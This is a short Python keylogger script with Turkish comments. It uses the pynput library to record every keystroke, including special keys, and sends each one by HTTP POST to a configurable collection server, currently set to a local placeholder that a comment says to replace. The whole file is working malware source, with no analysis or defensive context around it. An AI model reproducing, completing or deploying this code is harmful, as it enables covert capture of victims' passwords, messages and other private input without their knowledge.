import logging
from pynput import keyboard
import requests

# logging seviyesini ERROR olarak ayarlayalım, böylece sadece önemli mesajlar görünsün
logging.basicConfig(level=logging.ERROR)

# Sunucu URL'sini buraya girin
SERVER_URL = 'http://127.0.0.1:4444/log'

def on_press(key):
    try:
        # Basılan tuşu al
        key_char = key.char
    except AttributeError:
        # Özel tuşları al
        key_char = str(key)
    
    # Tuş vuruşunu sunucuya gönder
    payload = {
        'key': key_char
    }
    try:
        response = requests.post(SERVER_URL, json=payload)
        print(f"Sunucuya gönderildi: {key_char}")
    except Exception as e:
        print(f"Sunucuya gönderirken hata oluştu: {e}")

# Keylogger'ı başlat
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
